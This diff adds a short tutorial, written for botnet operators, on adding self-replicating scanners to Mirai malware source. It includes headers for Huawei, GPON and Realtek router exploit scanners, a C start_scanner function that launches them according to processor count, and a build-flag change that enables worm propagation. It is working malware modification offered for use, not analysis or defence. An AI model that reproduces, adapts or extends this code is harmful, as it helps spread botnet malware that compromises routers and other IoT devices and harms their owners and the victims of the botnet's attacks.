@@ -1,0 +1,58 @@
+Welcome Back, Toady Im Showing You How To Add A Selfrep Into A Mirai Source, This Is One Of Multiple Ways To Do This.
+
+First We Need To Include The Selfreps Headers By Adding
+
+These Will Vary Depending On Your Selfreps.
+
+#include "huawei_scanner.h"
+#include "gpon80_scanner.h"
+#include "gpon8080_scanner.h"
+#include "realtek_scanner.h"
+
+Next, We Are Going To Add A Piece Of Code To Make The Reps Work So To Say <3
+Edit The "ints" To Match The Code You Need. These Can Be Found In The .h Of The Files.
+Mine Is Setup For Gpon80, Gpon8080, Realtek And Huawei.
+
+SelfRep Code:
+#ifdef SELFREP
+void start_scanner(void)
+{
+	int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
+	
+	srand(time(NULL));
+	rand_num = rand() % 100;
+	
+	if(processors > 1)
+	{
+		#ifdef DEBUG
+			printf("[debug] device has 2 or more processors, running both scanners.");
+		#endif
+		huaweiscanner_scanner_init();
+		realtek_scanner();
+		gpon8080_scanner();
+		gpon80_scanner();
+		scanner_init();
+	} else if(rand_num > 35)
+	{
+		gpon8080_scanner();
+		gpon80_scanner();
+	} else
+	{
+		huaweiscanner_scanner_init();
+		realtek_scanner();
+		scanner_init();
+	}
+}
+#endif
+
+
+Next We Edit The Build.sh By Adding " -DSELFREP" To The Compile Stage.
+
+Thats Pretty Much It, Besides Editing The Reps To Run For Your Net, But Thats Self Explanitory.
+
+
+
+
+
+
+
